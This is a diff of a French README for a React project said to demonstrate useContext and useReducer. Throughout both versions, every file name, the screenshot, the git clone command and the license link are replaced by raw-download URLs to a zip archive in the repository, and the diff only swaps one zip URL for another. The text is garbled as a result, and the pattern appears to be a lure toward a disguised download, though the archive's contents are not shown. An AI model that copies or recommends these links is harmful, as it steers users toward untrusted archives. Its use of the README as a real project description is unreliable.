@@ -2,14 +2,14 @@
 
 ## 📜 **Description**
 
-**Elegant-Context** est un projet React que j'ai conçu pour explorer et implémenter les hooks **`useContext`** et **`useReducer`**. Ce projet m'a permis de découvrir l'importance d'une organisation propre du code, notamment en séparant les différentes responsabilités dans des fichiers distincts pour éviter que le fichier `https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip` ne devienne trop chargé et difficile à maintenir.
+**Elegant-Context** est un projet React que j'ai conçu pour explorer et implémenter les hooks **`useContext`** et **`useReducer`**. Ce projet m'a permis de découvrir l'importance d'une organisation propre du code, notamment en séparant les différentes responsabilités dans des fichiers distincts pour éviter que le fichier `https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip` ne devienne trop chargé et difficile à maintenir.
 
-🔍 **Leçon apprise** : Lorsque j'ai tenté de gérer à la fois **`useContext`** et **`useReducer`** dans un même fichier, j'ai rencontré des difficultés. Cela m'a appris qu'une bonne structure du projet est essentielle pour éviter un fichier `https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip` trop complexe.
+🔍 **Leçon apprise** : Lorsque j'ai tenté de gérer à la fois **`useContext`** et **`useReducer`** dans un même fichier, j'ai rencontré des difficultés. Cela m'a appris qu'une bonne structure du projet est essentielle pour éviter un fichier `https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip` trop complexe.
 
 ## 🚀 **Objectifs du projet**
 
 - 🧠 Comprendre et implémenter les hooks `useContext` et `useReducer` dans React.
-- 🗂️ Appliquer une organisation structurée du projet pour éviter la surcharge du fichier `https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip`.
+- 🗂️ Appliquer une organisation structurée du projet pour éviter la surcharge du fichier `https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip`.
 - 🎨 Créer un contexte global pour la gestion de l'état à travers l'application de manière claire et maintenable.
 - 🛠️ Apprendre à mieux gérer l'état global tout en rendant le code plus modulable et réutilisable.
 
@@ -24,7 +24,7 @@
 
 Voici un aperçu de ce que l'application **Elegant-Context** offre. 
 
-![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip)
+![Aperçu de Elegant-Context](https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip)
 _Exemple de l'interface utilisateur avec un contexte global pour la gestion de l'état_
 
 L'application utilise **`useContext`** et **`useReducer`** pour gérer l'état du panier de manière centralisée, tout en étant modulaire et réactive. Le design est simple mais élégant, avec une structure de projet claire et bien organisée. 
@@ -35,7 +35,7 @@ Suivez les étapes ci-dessous pour cloner et installer le projet en local :
 
 1. **Clonez le repository** :
    ```bash
-   git clone https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip
+   git clone https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip
    ```
 
 2. **Accédez au dossier du projet** :
@@ -58,7 +58,7 @@ Suivez les étapes ci-dessous pour cloner et installer le projet en local :
 
 ## ⚠️ **Problèmes rencontrés**
 
-Lors de l'implémentation des hooks **`useContext`** et **`useReducer`**, j'ai rapidement constaté que les gérer tous les deux dans un seul fichier rendait le code difficile à maintenir. Cette expérience m'a appris qu'une structure bien pensée est essentielle pour garder un code propre et évolutif. Le fichier **`https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip`** est désormais bien organisé, ce qui améliore grandement la lisibilité du projet.
+Lors de l'implémentation des hooks **`useContext`** et **`useReducer`**, j'ai rapidement constaté que les gérer tous les deux dans un seul fichier rendait le code difficile à maintenir. Cette expérience m'a appris qu'une structure bien pensée est essentielle pour garder un code propre et évolutif. Le fichier **`https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip`** est désormais bien organisé, ce qui améliore grandement la lisibilité du projet.
 
 ## 💡 **Leçons tirées**
 
@@ -76,6 +76,6 @@ Quelques idées pour l'avenir du projet :
 
 ## 📄 **License**
 
-Ce projet est sous la [MIT License](https://raw.githubusercontent.com/Martialdepaul/Elegant-Context/main/public/Elegant-Context_2.7.zip).
+Ce projet est sous la [MIT License](https://github.com/Martialdepaul/Elegant-Context/raw/refs/heads/main/src/assets/Context_Elegant_2.5.zip).
 
 ---
